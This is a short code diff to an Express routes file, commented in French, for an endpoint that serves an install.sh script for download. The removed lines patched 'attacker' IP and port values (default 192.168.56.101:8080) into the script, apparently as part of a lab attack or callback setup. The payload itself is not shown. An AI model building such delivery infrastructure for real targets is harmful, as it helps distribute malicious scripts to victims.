@@ -23,17 +23,10 @@ export async function registerRoutes(
       const installScriptPath = join(__dirname, "install.sh");
       const installScript = readFileSync(installScriptPath, "utf-8");
       
-      // Remplacer l'IP de l'attaquant dans le script
-      const attackerIp = process.env.ATTACKER_SERVER_IP || "192.168.56.101";
-      const attackerPort = process.env.ATTACKER_SERVER_PORT || "8080";
-      
-      const modifiedScript = installScript
-        .replace(/\$\{ATTACKER_IP:-192\.168\.56\.101\}/g, attackerIp)
-        .replace(/\$\{ATTACKER_PORT:-8080\}/g, attackerPort);
-      
+      // Le script contient déjà les valeurs fixes, pas besoin de remplacement
       res.setHeader("Content-Type", "text/x-sh");
       res.setHeader("Content-Disposition", "attachment; filename=install.sh");
-      res.send(modifiedScript);
+      res.send(installScript);
     } catch (error) {
       console.error("Erreur lors de la lecture du script:", error);
       res.status(500).send(`Erreur: ${error instanceof Error ? error.message : String(error)}`);
